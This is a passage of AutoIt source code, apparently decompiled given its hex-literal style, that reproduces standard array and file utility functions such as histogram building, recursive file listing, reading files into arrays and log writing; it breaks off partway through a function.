        Return SetError(0x7, 0x0, 0x0)
    ElseIf $iinttype <> $arrayunique_force32 Then
        Local $avalues[$odictionary .Count]
        For $vkey In $odictionary .Keys()
            $avalues[$j] = $ODICTIONARY($vkey)
            If StringLeft($vkey, 0x5) = "#Ptr#" Then
                $avalues[$j] = Ptr($avalues[$j])
            EndIf
            $j += 0x1
        Next
    Else
        $avalues = $odictionary .Keys()
    EndIf
    If $icount Then
        _ArrayInsert($avalues, 0x0, $odictionary .Count)
    EndIf
    Return $avalues
EndFunc   ;==>_ARRAYUNIQUE
Func _Array1DToHistogram($aarray, $isizing = 0x64)
    If UBound($aarray, 0x0) > 0x1 Then Return SetError(0x1, 0x0, "")
    $isizing = $isizing * 0x8
    Local $t, $n, $imin = 0x0, $imax = 0x0, $ioffset = 0x0
    For $i = 0x0 To UBound($aarray) + 0xffffffff
        $t = $aarray[$i]
        $t = IsNumber($t) ? Round($t) : 0x0
        If $t < $imin Then $imin = $t
        If $t > $imax Then $imax = $t
    Next
    Local $irange = Int(Round(($imax - $imin) / 0x8)) * 0x8
    Local $ispaceratio = 0x4
    For $i = 0x0 To UBound($aarray) + 0xffffffff
        $t = $aarray[$i]
        If $t Then
            $n = Abs(Round(($isizing * $t) / $irange) / 0x8)
            $aarray[$i] = ""
            If $t > 0x0 Then
                If $imin Then
                    $ioffset = Int(Abs(Round(($isizing * $imin) / $irange) / 0x8) / 0x8 * $ispaceratio)
                    $aarray[$i] = __ARRAY_STRINGREPEAT(ChrW(0x20), $ioffset)
                EndIf
            Else
                If $imin <> $t Then
                    $ioffset = Int(Abs(Round(($isizing * ($t - $imin)) / $irange) / 0x8) / 0x8 * $ispaceratio)
                    $aarray[$i] = __ARRAY_STRINGREPEAT(ChrW(0x20), $ioffset)
                EndIf
            EndIf
            $aarray[$i] &= __ARRAY_STRINGREPEAT(ChrW(0x2588), Int($n / 0x8))
            $n = Mod($n, 0x8)
            If $n > 0x0 Then $aarray[$i] &= ChrW(0x2588 + 0x8 - $n)
            $aarray[$i] &= " " & $t
        Else
            $aarray[$i] = ""
        EndIf
    Next
    Return $aarray
EndFunc   ;==>_ARRAY1DTOHISTOGRAM
Func _ARRAY2DCREATE($aarray1, $aarray2)
    If Not IsArray($aarray1) Or Not IsArray($aarray2) Then Return SetError(0x3, 0x0, "")
    Local $idim1 = UBound($aarray1, $ubound_dimensions), $idim2 = UBound($aarray2, $ubound_dimensions)
    If $idim1 > 0x2 Or $idim2 > 0x2 Then Return SetError(0x1, 0x0, "")
    Local $nrows = UBound($aarray1, $ubound_rows)
    If $nrows <> UBound($aarray2, $ubound_rows) Then Return SetError(0x2, 0x0, "")
    Local $ncols1 = ($idim1 = 0x1 ? 0x1 : UBound($aarray1, $ubound_columns))
    Local $ncols2 = ($idim2 = 0x1 ? 0x1 : UBound($aarray2, $ubound_columns))
    Local $atmp[$nrows][$ncols1 + $ncols2]
    Select
        Case $idim1 = 0x1 And $idim2 = 0x1
            For $i = 0x0 To $nrows + 0xffffffff
                $atmp[$i][0x0] = $aarray1[$i]
                $atmp[$i][0x1] = $aarray2[$i]
            Next
        Case $idim1 = 0x1 And $idim2 = 0x2
            For $i = 0x0 To $nrows + 0xffffffff
                $atmp[$i][0x0] = $aarray1[$i]
            Next
            For $j = 0x1 To $ncols2
                For $i = 0x0 To $nrows + 0xffffffff
                    $atmp[$i][$j] = $aarray2[$i][$j + 0xffffffff]
                Next
            Next
        Case $idim1 = 0x2 And $idim2 = 0x1
            For $j = 0x0 To $ncols1 + 0xffffffff
                For $i = 0x0 To $nrows + 0xffffffff
                    $atmp[$i][$j] = $aarray1[$i][$j]
                Next
            Next
            For $i = 0x0 To $nrows + 0xffffffff
                $atmp[$i][$ncols1] = $aarray2[$i]
            Next
        Case $idim1 = 0x2 And $idim2 = 0x2
            For $j = 0x0 To $ncols1 + 0xffffffff
                For $i = 0x0 To $nrows + 0xffffffff
                    $atmp[$i][$j] = $aarray1[$i][$j]
                Next
            Next
            For $j = $ncols1 To ($ncols1 + $ncols2) + 0xffffffff
                For $i = 0x0 To $nrows + 0xffffffff
                    $atmp[$i][$j] = $aarray2[$i][$j - $ncols1]
                Next
            Next
    EndSelect
    Return $atmp
EndFunc   ;==>_ARRAY2DCREATE
Func __ARRAY_STRINGREPEAT($sstring, $irepeatcount)
    $irepeatcount = Int($irepeatcount)
    If StringLen($sstring) < 0x1 Or $irepeatcount <= 0x0 Then Return SetError(0x1, 0x0, "")
    Local $sresult = ""
    While $irepeatcount > 0x1
        If BitAND($irepeatcount, 0x1) Then $sresult &= $sstring
        $sstring &= $sstring
        $irepeatcount = BitShift($irepeatcount, 0x1)
    WEnd
    Return $sstring & $sresult
EndFunc   ;==>__ARRAY_STRINGREPEAT
Func __ARRAY_EXETERINTERNAL(ByRef $aarray, $istart, $isize, $sdelimiter, ByRef $aidx, ByRef $aresult, ByRef $icount)
    If $istart == $isize + 0xffffffff Then
        For $i = 0x0 To $isize + 0xffffffff
            $aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
        Next
        If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], StringLen($sdelimiter))
        $icount += 0x1
    Else
        Local $itemp
        For $i = $istart To $isize + 0xffffffff
            $itemp = $aidx[$i]
            $aidx[$i] = $aidx[$istart]
            $aidx[$istart] = $itemp
            __ARRAY_EXETERINTERNAL($aarray, $istart + 0x1, $isize, $sdelimiter, $aidx, $aresult, $icount)
            $aidx[$istart] = $aidx[$i]
            $aidx[$i] = $itemp
        Next
    EndIf
EndFunc   ;==>__ARRAY_EXETERINTERNAL
Func __ARRAY_COMBINATIONS($in, $ir)
    Local $i_total = 0x1
    For $i = $ir To 0x1 Step +0xffffffff
        $i_total *= ($in / $i)
        $in -= 0x1
    Next
    Return Round($i_total)
EndFunc   ;==>__ARRAY_COMBINATIONS
Func __ARRAY_GETNEXT($in, $ir, ByRef $ileft, $itotal, ByRef $aidx)
    If $ileft == $itotal Then
        $ileft -= 0x1
        Return
    EndIf
    Local $i = $ir + 0xffffffff
    While $aidx[$i] == $in - $ir + $i
        $i -= 0x1
    WEnd
    $aidx[$i] += 0x1
    For $j = $i + 0x1 To $ir + 0xffffffff
        $aidx[$j] = $aidx[$i] + $j - $i
    Next
    $ileft -= 0x1
EndFunc   ;==>__ARRAY_GETNEXT
Func __ARRAY_MINMAXINDEX(Const ByRef $aarray, $icompnumeric, $istart, $iend, $isubitem, $fucomparison)
    If $icompnumeric = Default Then $icompnumeric = 0x0
    If $icompnumeric <> 0x1 Then $icompnumeric = 0x0
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If $idim_1 < 0x0 Then Return SetError(0x1, 0x0, +0xffffffff)
    If $iend = +0xffffffff Then $iend = $idim_1
    If $istart = +0xffffffff Then $istart = 0x0
    If $istart < +0xffffffff Or $iend < +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart > $idim_1 Or $iend > $idim_1 Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    If $idim_1 < 0x0 Then Return SetError(0x5, 0x0, +0xffffffff)
    Local $imaxminindex = $istart
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $icompnumeric Then
                For $i = $istart To $iend
                    If $FUCOMPARISON(Number($aarray[$i]), Number($aarray[$imaxminindex])) Then $imaxminindex = $i
                Next
            Else
                For $i = $istart To $iend
                    If $FUCOMPARISON($aarray[$i], $aarray[$imaxminindex]) Then $imaxminindex = $i
                Next
            EndIf
        Case 0x2
            If $isubitem < 0x0 Or $isubitem > UBound($aarray, $ubound_columns) + 0xffffffff Then Return SetError(0x6, 0x0, +0xffffffff)
            If $icompnumeric Then
                For $i = $istart To $iend
                    If $FUCOMPARISON(Number($aarray[$i][$isubitem]), Number($aarray[$imaxminindex][$isubitem])) Then $imaxminindex = $i
                Next
            Else
                For $i = $istart To $iend
                    If $FUCOMPARISON($aarray[$i][$isubitem], $aarray[$imaxminindex][$isubitem]) Then $imaxminindex = $i
                Next
            EndIf
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return $imaxminindex
EndFunc   ;==>__ARRAY_MINMAXINDEX
Func __ARRAY_GREATERTHAN($vvalue1, $vvalue2)
    Return $vvalue1 > $vvalue2
EndFunc   ;==>__ARRAY_GREATERTHAN
Func __ARRAY_LESSTHAN($vvalue1, $vvalue2)
    Return $vvalue1 < $vvalue2
EndFunc   ;==>__ARRAY_LESSTHAN
Func __ARRAYUNIQUE_AUTOERRFUNC()
EndFunc   ;==>__ARRAYUNIQUE_AUTOERRFUNC
Func _FileCountLines($sfilepath)
    FileReadToArray($sfilepath)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return @extended
EndFunc   ;==>_FILECOUNTLINES
Func _FileCreate($sfilepath)
    Local $hfileopen = FileOpen($sfilepath, BitOR($fo_overwrite, $fo_createpath))
    If $hfileopen = +0xffffffff Then Return SetError(0x1, 0x0, 0x0)
    Local $ifilewrite = FileWrite($hfileopen, "")
    FileClose($hfileopen)
    If Not $ifilewrite Then Return SetError(0x2, 0x0, 0x0)
    Return 0x1
EndFunc   ;==>_FILECREATE
Func _FileListToArray($sfilepath, $sfilter = "*", $iflag = $flta_filesfolders, $breturnpath = False)
    Local $sdelimiter = "|", $sfilelist = "", $sfilename = "", $sfullpath = ""
    $sfilepath = StringRegExpReplace($sfilepath, "[\\/]+$", "") & "\"
    If $iflag = Default Then $iflag = $flta_filesfolders
    If $breturnpath Then $sfullpath = $sfilepath
    If $sfilter = Default Then $sfilter = "*"
    If Not FileExists($sfilepath) Then Return SetError(0x1, 0x0, 0x0)
    If StringRegExp($sfilter, "[\\/:><\|]|(?s)^\s*$") Then Return SetError(0x2, 0x0, 0x0)
    If Not ($iflag = 0x0 Or $iflag = 0x1 Or $iflag = 0x2) Then Return SetError(0x3, 0x0, 0x0)
    Local $hsearch = FileFindFirstFile($sfilepath & $sfilter)
    If @error Then Return SetError(0x4, 0x0, 0x0)
    While 0x1
        $sfilename = FileFindNextFile($hsearch)
        If @error Then ExitLoop
        If ($iflag + @extended = 0x2) Then ContinueLoop
        $sfilelist &= $sdelimiter & $sfullpath & $sfilename
    WEnd
    FileClose($hsearch)
    If $sfilelist = "" Then Return SetError(0x4, 0x0, 0x0)
    Return StringSplit(StringTrimLeft($sfilelist, 0x1), $sdelimiter)
EndFunc   ;==>_FILELISTTOARRAY
Func _FileListToArrayRec($sfilepath, $smask = "*", $ireturn = $fltar_filesfolders, $irecur = $fltar_norecur, $isort = $fltar_nosort, $ireturnpath = $fltar_relpath)
    If Not FileExists($sfilepath) Then Return SetError(0x1, 0x1, "")
    If $smask = Default Then $smask = "*"
    If $ireturn = Default Then $ireturn = $fltar_filesfolders
    If $irecur = Default Then $irecur = $fltar_norecur
    If $isort = Default Then $isort = $fltar_nosort
    If $ireturnpath = Default Then $ireturnpath = $fltar_relpath
    If $irecur > 0x1 Or Not IsInt($irecur) Then Return SetError(0x1, 0x6, "")
    Local $blongpath = False
    If StringLeft($sfilepath, 0x4) == "\\?\" Then
        $blongpath = True
    EndIf
    Local $sfolderslash = ""
    If StringRight($sfilepath, 0x1) = "\" Then
        $sfolderslash = "\"
    Else
        $sfilepath = $sfilepath & "\"
    EndIf
    Local $asfoldersearchlist[0x64] = [0x1]
    $asfoldersearchlist[0x1] = $sfilepath
    Local $ihide_hs = 0x0, $shide_hs = ""
    If BitAND($ireturn, $fltar_nohidden) Then
        $ihide_hs += 0x2
        $shide_hs &= "H"
        $ireturn -= $fltar_nohidden
    EndIf
    If BitAND($ireturn, $fltar_nosystem) Then
        $ihide_hs += 0x4
        $shide_hs &= "S"
        $ireturn -= $fltar_nosystem
    EndIf
    Local $ihide_link = 0x0
    If BitAND($ireturn, $fltar_nolink) Then
        $ihide_link = 0x400
        $ireturn -= $fltar_nolink
    EndIf
    Local $imaxlevel = 0x0
    If $irecur < 0x0 Then
        StringReplace($sfilepath, "\", "", 0x0, $str_nocasesensebasic)
        $imaxlevel = @extended - $irecur
    EndIf
    Local $sexclude_list = "", $sexclude_list_folder = "", $sinclude_list = "*"
    Local $amasksplit = StringSplit($smask, "|")
    Switch $amasksplit[0x0]
        Case 0x3
            $sexclude_list_folder = $amasksplit[0x3]
            ContinueCase
        Case 0x2
            $sexclude_list = $amasksplit[0x2]
            ContinueCase
        Case 0x1
            $sinclude_list = $amasksplit[0x1]
    EndSwitch
    Local $sinclude_file_mask = ".+"
    If $sinclude_list <> "*" Then
        If Not __FLTAR_LISTTOMASK($sinclude_file_mask, $sinclude_list) Then Return SetError(0x1, 0x2, "")
    EndIf
    Local $sinclude_folder_mask = ".+"
    Switch $ireturn
        Case 0x0
            Switch $irecur
                Case 0x0
                    $sinclude_folder_mask = $sinclude_file_mask
            EndSwitch
        Case 0x2
            $sinclude_folder_mask = $sinclude_file_mask
    EndSwitch
    Local $sexclude_file_mask = ":"
    If $sexclude_list <> "" Then
        If Not __FLTAR_LISTTOMASK($sexclude_file_mask, $sexclude_list) Then Return SetError(0x1, 0x3, "")
    EndIf
    Local $sexclude_folder_mask = ":"
    If $irecur Then
        If $sexclude_list_folder Then
            If Not __FLTAR_LISTTOMASK($sexclude_folder_mask, $sexclude_list_folder) Then Return SetError(0x1, 0x4, "")
        EndIf
        If $ireturn = 0x2 Then
            $sexclude_folder_mask = $sexclude_file_mask
        EndIf
    Else
        $sexclude_folder_mask = $sexclude_file_mask
    EndIf
    If Not ($ireturn = 0x0 Or $ireturn = 0x1 Or $ireturn = 0x2) Then Return SetError(0x1, 0x5, "")
    If Not ($isort = 0x0 Or $isort = 0x1 Or $isort = 0x2) Then Return SetError(0x1, 0x7, "")
    If Not ($ireturnpath = 0x0 Or $ireturnpath = 0x1 Or $ireturnpath = 0x2) Then Return SetError(0x1, 0x8, "")
    If $ihide_link Then
        Local $tfile_data = DllStructCreate("struct;align 4;dword FileAttributes;uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;" & "dword FileSizeHigh;dword FileSizeLow;dword Reserved0;dword Reserved1;wchar FileName[260];wchar AlternateFileName[14];endstruct")
        Local $hdll = DllOpen("kernel32.dll"), $adll_ret
    EndIf
    Local $asreturnlist[0x64] = [0x0]
    Local $asfilematchlist = $asreturnlist, $asrootfilematchlist = $asreturnlist, $asfoldermatchlist = $asreturnlist
    Local $bfolder = False, $hsearch = 0x0, $scurrentpath = "", $sname = "", $sretpath = ""
    Local $iattribs = 0x0, $sattribs = ""
    Local $asfolderfilesectionlist[0x64][0x2] = [[0x0, 0x0]]
    While $asfoldersearchlist[0x0] > 0x0
        $scurrentpath = $asfoldersearchlist[$asfoldersearchlist[0x0]]
        $asfoldersearchlist[0x0] -= 0x1
        Switch $ireturnpath
            Case 0x1
                $sretpath = StringReplace($scurrentpath, $sfilepath, "")
            Case 0x2
                If $blongpath Then
                    $sretpath = StringTrimLeft($scurrentpath, 0x4)
                Else
                    $sretpath = $scurrentpath
                EndIf
        EndSwitch
        If $ihide_link Then
            $adll_ret = DllCall($hdll, "handle", "FindFirstFileW", "wstr", $scurrentpath & "*", "struct*", $tfile_data)
            If @error Or Not $adll_ret[0x0] Then
                ContinueLoop
            EndIf
            $hsearch = $adll_ret[0x0]
        Else
            $hsearch = FileFindFirstFile($scurrentpath & "*")
            If $hsearch = +0xffffffff Then
                ContinueLoop
            EndIf
        EndIf
        If $ireturn = 0x0 And $isort And $ireturnpath Then
            __FLTAR_ADDTOLIST($asfolderfilesectionlist, $sretpath, $asfilematchlist[0x0] + 0x1)
        EndIf
        $sattribs = ""
        While 0x1
            If $ihide_link Then
                $adll_ret = DllCall($hdll, "int", "FindNextFileW", "handle", $hsearch, "struct*", $tfile_data)
                If @error Or Not $adll_ret[0x0] Then
                    ExitLoop
                EndIf
                $sname = DllStructGetData($tfile_data, "FileName")
                If $sname = ".." Or $sname = "." Then
                    ContinueLoop
                EndIf
                $iattribs = DllStructGetData($tfile_data, "FileAttributes")
                If $ihide_hs And BitAND($iattribs, $ihide_hs) Then
                    ContinueLoop
                EndIf
                If BitAND($iattribs, $ihide_link) Then
                    ContinueLoop
                EndIf
                $bfolder = False
                If BitAND($iattribs, 0x10) Then
                    $bfolder = True
                EndIf
            Else
                $bfolder = False
                $sname = FileFindNextFile($hsearch, 0x1)
                If @error Then
                    ExitLoop
                EndIf
                If $sname = ".." Or $sname = "." Then
                    ContinueLoop
                EndIf
                $sattribs = @extended
                If StringInStr($sattribs, "D") Then
                    $bfolder = True
                EndIf
                If StringRegExp($sattribs, "[" & $shide_hs & "]") Then
                    ContinueLoop
                EndIf
            EndIf
            If $bfolder Then
                Select
                    Case $irecur < 0x0
                        StringReplace($scurrentpath, "\", "", 0x0, $str_nocasesensebasic)
                        If @extended < $imaxlevel Then
                            ContinueCase
                        EndIf
                    Case $irecur = 0x1
                        If Not StringRegExp($sname, $sexclude_folder_mask) Then
                            __FLTAR_ADDTOLIST($asfoldersearchlist, $scurrentpath & $sname & "\")
                        EndIf
                EndSelect
            EndIf
            If $isort Then
                If $bfolder Then
                    If StringRegExp($sname, $sinclude_folder_mask) And Not StringRegExp($sname, $sexclude_folder_mask) Then
                        __FLTAR_ADDTOLIST($asfoldermatchlist, $sretpath & $sname & $sfolderslash)
                    EndIf
                Else
                    If StringRegExp($sname, $sinclude_file_mask) And Not StringRegExp($sname, $sexclude_file_mask) Then
                        If $scurrentpath = $sfilepath Then
                            __FLTAR_ADDTOLIST($asrootfilematchlist, $sretpath & $sname)
                        Else
                            __FLTAR_ADDTOLIST($asfilematchlist, $sretpath & $sname)
                        EndIf
                    EndIf
                EndIf
            Else
                If $bfolder Then
                    If $ireturn <> 0x1 And StringRegExp($sname, $sinclude_folder_mask) And Not StringRegExp($sname, $sexclude_folder_mask) Then
                        __FLTAR_ADDTOLIST($asreturnlist, $sretpath & $sname & $sfolderslash)
                    EndIf
                Else
                    If $ireturn <> 0x2 And StringRegExp($sname, $sinclude_file_mask) And Not StringRegExp($sname, $sexclude_file_mask) Then
                        __FLTAR_ADDTOLIST($asreturnlist, $sretpath & $sname)
                    EndIf
                EndIf
            EndIf
        WEnd
        If $ihide_link Then
            DllCall($hdll, "int", "FindClose", "ptr", $hsearch)
        Else
            FileClose($hsearch)
        EndIf
    WEnd
    If $ihide_link Then
        DllClose($hdll)
    EndIf
    If $isort Then
        Switch $ireturn
            Case 0x2
                If $asfoldermatchlist[0x0] = 0x0 Then Return SetError(0x1, 0x9, "")
                ReDim $asfoldermatchlist[$asfoldermatchlist[0x0] + 0x1]
                $asreturnlist = $asfoldermatchlist
                __ARRAYDUALPIVOTSORT($asreturnlist, 0x1, $asreturnlist[0x0])
            Case 0x1
                If $asrootfilematchlist[0x0] = 0x0 And $asfilematchlist[0x0] = 0x0 Then Return SetError(0x1, 0x9, "")
                If $ireturnpath = 0x0 Then
                    __FLTAR_ADDFILELISTS($asreturnlist, $asrootfilematchlist, $asfilematchlist)
                    __ARRAYDUALPIVOTSORT($asreturnlist, 0x1, $asreturnlist[0x0])
                Else
                    __FLTAR_ADDFILELISTS($asreturnlist, $asrootfilematchlist, $asfilematchlist, 0x1)
                EndIf
            Case 0x0
                If $asrootfilematchlist[0x0] = 0x0 And $asfoldermatchlist[0x0] = 0x0 Then Return SetError(0x1, 0x9, "")
                If $ireturnpath = 0x0 Then
                    __FLTAR_ADDFILELISTS($asreturnlist, $asrootfilematchlist, $asfilematchlist)
                    $asreturnlist[0x0] += $asfoldermatchlist[0x0]
                    ReDim $asfoldermatchlist[$asfoldermatchlist[0x0] + 0x1]
                    _ArrayConcatenate($asreturnlist, $asfoldermatchlist, 0x1)
                    __ARRAYDUALPIVOTSORT($asreturnlist, 0x1, $asreturnlist[0x0])
                Else
                    Local $asreturnlist[$asfilematchlist[0x0] + $asrootfilematchlist[0x0] + $asfoldermatchlist[0x0] + 0x1]
                    $asreturnlist[0x0] = $asfilematchlist[0x0] + $asrootfilematchlist[0x0] + $asfoldermatchlist[0x0]
                    __ARRAYDUALPIVOTSORT($asrootfilematchlist, 0x1, $asrootfilematchlist[0x0])
                    For $i = 0x1 To $asrootfilematchlist[0x0]
                        $asreturnlist[$i] = $asrootfilematchlist[$i]
                    Next
                    Local $inextinsertionindex = $asrootfilematchlist[0x0] + 0x1
                    __ARRAYDUALPIVOTSORT($asfoldermatchlist, 0x1, $asfoldermatchlist[0x0])
                    Local $sfoldertofind = ""
                    For $i = 0x1 To $asfoldermatchlist[0x0]
                        $asreturnlist[$inextinsertionindex] = $asfoldermatchlist[$i]
                        $inextinsertionindex += 0x1
                        If $sfolderslash Then
                            $sfoldertofind = $asfoldermatchlist[$i]
                        Else
                            $sfoldertofind = $asfoldermatchlist[$i] & "\"
                        EndIf
                        Local $ifilesectionendindex = 0x0, $ifilesectionstartindex = 0x0
                        For $j = 0x1 To $asfolderfilesectionlist[0x0][0x0]
                            If $sfoldertofind = $asfolderfilesectionlist[$j][0x0] Then
                                $ifilesectionstartindex = $asfolderfilesectionlist[$j][0x1]
                                If $j = $asfolderfilesectionlist[0x0][0x0] Then
                                    $ifilesectionendindex = $asfilematchlist[0x0]
                                Else
                                    $ifilesectionendindex = $asfolderfilesectionlist[$j + 0x1][0x1] + 0xffffffff
                                EndIf
                                If $isort = 0x1 Then
                                    __ARRAYDUALPIVOTSORT($asfilematchlist, $ifilesectionstartindex, $ifilesectionendindex)
                                EndIf
                                For $k = $ifilesectionstartindex To $ifilesectionendindex
                                    $asreturnlist[$inextinsertionindex] = $asfilematchlist[$k]
                                    $inextinsertionindex += 0x1
                                Next
                                ExitLoop
                            EndIf
                        Next
                    Next
                EndIf
        EndSwitch
    Else
        If $asreturnlist[0x0] = 0x0 Then Return SetError(0x1, 0x9, "")
        ReDim $asreturnlist[$asreturnlist[0x0] + 0x1]
    EndIf
    Return $asreturnlist
EndFunc   ;==>_FILELISTTOARRAYREC
Func __FLTAR_ADDFILELISTS(ByRef $astarget, $assource_1, $assource_2, $isort = 0x0)
    ReDim $assource_1[$assource_1[0x0] + 0x1]
    If $isort = 0x1 Then __ARRAYDUALPIVOTSORT($assource_1, 0x1, $assource_1[0x0])
    $astarget = $assource_1
    $astarget[0x0] += $assource_2[0x0]
    ReDim $assource_2[$assource_2[0x0] + 0x1]
    If $isort = 0x1 Then __ARRAYDUALPIVOTSORT($assource_2, 0x1, $assource_2[0x0])
    _ArrayConcatenate($astarget, $assource_2, 0x1)
EndFunc   ;==>__FLTAR_ADDFILELISTS
Func __FLTAR_ADDTOLIST(ByRef $alist, $vvalue_0, $vvalue_1 = +0xffffffff)
    If $vvalue_1 = +0xffffffff Then
        $alist[0x0] += 0x1
        If UBound($alist) <= $alist[0x0] Then ReDim $alist[UBound($alist) * 0x2]
        $alist[$alist[0x0]] = $vvalue_0
    Else
        $alist[0x0][0x0] += 0x1
        If UBound($alist) <= $alist[0x0][0x0] Then ReDim $alist[UBound($alist) * 0x2][0x2]
        $alist[$alist[0x0][0x0]][0x0] = $vvalue_0
        $alist[$alist[0x0][0x0]][0x1] = $vvalue_1
    EndIf
EndFunc   ;==>__FLTAR_ADDTOLIST
Func __FLTAR_LISTTOMASK(ByRef $smask, $slist)
    If StringRegExp($slist, "\\|/|:|\<|\>|\|") Then Return 0x0
    $slist = StringReplace(StringStripWS(StringRegExpReplace($slist, "\s*;\s*", ";"), BitOR($str_stripleading, $str_striptrailing)), ";", "|")
    $slist = StringReplace(StringReplace(StringRegExpReplace($slist, "[][$^.{}()+\-]", "\\$0"), "?", "."), "*", ".*?")
    $smask = "(?i)^(" & $slist & ")\z"
    Return 0x1
EndFunc   ;==>__FLTAR_LISTTOMASK
Func _FilePrint($sfilepath, $ishow = @SW_HIDE)
    Return ShellExecute($sfilepath, "", @WorkingDir, "print", $ishow = Default ? @SW_HIDE : $ishow)
EndFunc   ;==>_FILEPRINT
Func _FileReadToArray($sfilepath, ByRef $vreturn, $iflags = $frta_count, $sdelimiter = "")
    $vreturn = 0x0
    If $iflags = Default Then $iflags = $frta_count
    If $sdelimiter = Default Then $sdelimiter = ""
    Local $bexpand = True
    If BitAND($iflags, $frta_intarrays) Then
        $bexpand = False
        $iflags -= $frta_intarrays
    EndIf
    Local $ientire = $str_chrsplit
    If BitAND($iflags, $frta_entiresplit) Then
        $ientire = $str_entiresplit
        $iflags -= $frta_entiresplit
    EndIf
    Local $inocount = 0x0
    If $iflags <> $frta_count Then
        $iflags = $frta_nocount
        $inocount = $str_nocount
    EndIf
    If $sdelimiter Then
        Local $alines = FileReadToArray($sfilepath)
        If @error Then Return SetError(@error, 0x0, 0x0)
        Local $idim_1 = UBound($alines) + $iflags
        If $bexpand Then
            Local $idim_2 = UBound(StringSplit($alines[0x0], $sdelimiter, $ientire + $str_nocount))
            Local $atemp_array[$idim_1][$idim_2]
            Local $ifields, $asplit
            For $i = 0x0 To $idim_1 - $iflags + 0xffffffff
                $asplit = StringSplit($alines[$i], $sdelimiter, $ientire + $str_nocount)
                $ifields = UBound($asplit)
                If $ifields <> $idim_2 Then
                    Return SetError(0x3, 0x0, 0x0)
                EndIf
                For $j = 0x0 To $ifields + 0xffffffff
                    $atemp_array[$i + $iflags][$j] = $asplit[$j]
                Next
            Next
            If $idim_2 < 0x2 Then Return SetError(0x4, 0x0, 0x0)
            If $iflags Then
                $atemp_array[0x0][0x0] = $idim_1 - $iflags
                $atemp_array[0x0][0x1] = $idim_2
            EndIf
        Else
            Local $atemp_array[$idim_1]
            For $i = 0x0 To $idim_1 - $iflags + 0xffffffff
                $atemp_array[$i + $iflags] = StringSplit($alines[$i], $sdelimiter, $ientire + $inocount)
            Next
            If $iflags Then
                $atemp_array[0x0] = $idim_1 - $iflags
            EndIf
        EndIf
        $vreturn = $atemp_array
    Else
        If $iflags Then
            Local $hfileopen = FileOpen($sfilepath, $fo_read)
            If $hfileopen = +0xffffffff Then Return SetError(0x1, 0x0, 0x0)
            Local $sfileread = FileRead($hfileopen)
            FileClose($hfileopen)
            If StringLen($sfileread) Then
                $vreturn = StringRegExp(@LF & $sfileread, "(?|(\N+)\z|(\N*)(?:\R))", $str_regexparrayglobalmatch)
                $vreturn[0x0] = UBound($vreturn) + 0xffffffff
            Else
                Return SetError(0x2, 0x0, 0x0)
            EndIf
        Else
            $vreturn = FileReadToArray($sfilepath)
            If @error Then
                $vreturn = 0x0
                Return SetError(@error, 0x0, 0x0)
            EndIf
        EndIf
    EndIf
    Return 0x1
EndFunc   ;==>_FILEREADTOARRAY
Func _FileWriteFromArray($sfilepath, Const ByRef $aarray, $ibase = Default, $iubound = Default, $sdelimiter = "|")
    Local $ireturn = 0x0
    If Not IsArray($aarray) Then Return SetError(0x2, 0x0, $ireturn)
    Local $idims = UBound($aarray, $ubound_dimensions)
    If $idims > 0x2 Then Return SetError(0x4, 0x0, 0x0)
    Local $ilast = UBound($aarray) + 0xffffffff
    If $iubound = Default Or $iubound > $ilast Then $iubound = $ilast
    If $ibase < 0x0 Or $ibase = Default Then $ibase = 0x0
    If $ibase > $iubound Then Return SetError(0x5, 0x0, $ireturn)
    If $sdelimiter = Default Then $sdelimiter = "|"
    Local $hfileopen = $sfilepath
    If IsString($sfilepath) Then
        $hfileopen = FileOpen($sfilepath, $fo_overwrite)
        If $hfileopen = +0xffffffff Then Return SetError(0x1, 0x0, $ireturn)
    EndIf
    Local $ierror = 0x0
    $ireturn = 0x1
    Switch $idims
        Case 0x1
            For $i = $ibase To $iubound
                If Not FileWrite($hfileopen, $aarray[$i] & @CRLF) Then
                    $ierror = 0x3
                    $ireturn = 0x0
                    ExitLoop
                EndIf
            Next
        Case 0x2
            Local $stemp = ""
            For $i = $ibase To $iubound
                $stemp = $aarray[$i][0x0]
                For $j = 0x1 To UBound($aarray, $ubound_columns) + 0xffffffff
                    $stemp &= $sdelimiter & $aarray[$i][$j]
                Next
                If Not FileWrite($hfileopen, $stemp & @CRLF) Then
                    $ierror = 0x3
                    $ireturn = 0x0
                    ExitLoop
                EndIf
            Next
    EndSwitch
    If IsString($sfilepath) Then FileClose($hfileopen)
    Return SetError($ierror, 0x0, $ireturn)
EndFunc   ;==>_FILEWRITEFROMARRAY
Func _FileWriteLog($slogpath, $slogmsg, $iflag = +0xffffffff)
    Local $iopenmode = $fo_append
    Local $smsg = @YEAR & "-" & @MON & "-" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC & " : " & $slogmsg
    If $iflag = Default Then $iflag = +0xffffffff
    If $iflag <> +0xffffffff Then
        $iopenmode = $fo_overwrite
        $smsg &= @CRLF & FileRead($slogpath)
    EndIf
    Local $hfileopen = $slogpath
    If IsString($slogpath) Then $hfileopen = FileOpen($slogpath, $iopenmode)
    If $hfileopen = +0xffffffff Then Return SetError(0x1, 0x0, 0x0)
    Local $ireturn = FileWriteLine($hfileopen, $smsg)
    If IsString($slogpath) Then $ireturn = FileClose($hfileopen)
    If $iflag <> +0xffffffff And Not IsString($slogpath) Then SetExtended(0x1)
    If $ireturn = 0x0 Then Return SetError(0x2, 0x0, 0x0)
    Return $ireturn
EndFunc   ;==>_FILEWRITELOG
Func _FileWriteToLine($sfilepath, $iline, $stext, $boverwrite = False, $bfill = False)
    If $boverwrite = Default Then $boverwrite = False
    If $bfill = Default Then $bfill = False
    If Not FileExists($sfilepath) Then Return SetError(0x2, 0x0, 0x0)
    If $iline <= 0x0 Then Return SetError(0x4, 0x0, 0x0)
